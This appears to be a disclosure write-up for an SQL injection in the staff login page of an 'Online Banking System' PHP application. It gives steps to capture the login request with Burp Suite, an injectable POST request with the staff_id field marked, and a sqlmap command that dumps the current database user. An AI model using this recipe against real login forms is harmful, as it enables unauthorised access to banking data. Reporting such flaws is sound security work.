# Online Banking System SQL Injection
* `Description` => sql injection at `staff_login.php`
# Step to Reproduct
* `Staff Login` -> `Staff ID ` -> `Staff Password` -> `Login` -> `modify data` -> `Sqlmap`
# Exploit
* Input `Staff ID` and `Staff Password` -> `Login` 
![image](https://user-images.githubusercontent.com/79050415/159326849-427a43be-5e88-4535-ba60-7d41fe0906f1.png)
* Use Burp Suite capture request 
![image](https://user-images.githubusercontent.com/79050415/159327710-183afd91-1624-4733-88a7-491cca62fa8f.png)
* Then modify the data and save as `sqli.txt`
![image](https://user-images.githubusercontent.com/79050415/159327862-825f0250-9143-46ed-a5cb-c36d5ee29b3d.png)
* Scan `sqli.txt` on `Sqlmap`
```c
python3 sqlmap.py -r sqli.txt --batch --current-user
```
![image](https://user-images.githubusercontent.com/79050415/159328722-52415c05-ed4a-405b-ae9f-919692f58601.png)

# Vulnerable Code
![image](https://user-images.githubusercontent.com/79050415/159329104-f6734379-6e0f-4344-a7a9-d4baa41d2e34.png)
* No filter `Staff ID ` and `Staff Password` when inserting data to database
# Information Disclosure
![image](https://user-images.githubusercontent.com/79050415/159337062-c4045649-7665-4691-9a51-3d41d502d14e.png)

# POC
`Injection Point`
```c
staff_id=*&password=hhhhhhhhhh&staff_login-btn=LOGIN
```
* `Request`
```c
POST /Online-Banking/staff_login.php HTTP/1.1
Host: 192.168.1.101:8080
Content-Length: 57
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.1.101:8080
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.1.101:8080/Online-Banking/staff_login.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=jpkpok9b1tiholm7srir1b6mev
Connection: close

staff_id=*&password=hhhhhhhhhh&staff_login-btn=LOGIN
```
